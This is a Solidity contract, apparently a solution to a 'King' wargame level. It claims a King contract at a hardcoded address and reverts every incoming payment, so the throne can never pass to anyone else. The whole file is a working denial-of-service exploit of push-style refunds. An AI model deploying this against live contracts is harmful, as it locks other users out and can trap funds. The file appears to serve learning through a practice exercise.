// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./King.sol";

contract StayKing {
    King public king = King(payable(0xB55780538f5fA3078BCccbD2fDE3B5ff7957Fc94));

    function becomeKing() public payable {
        (bool success, ) = address(king).call{value: msg.value}("");
        require(success, "Call failed");
    }

    receive() external payable {
        revert("I will stay king forever!");
    }
}
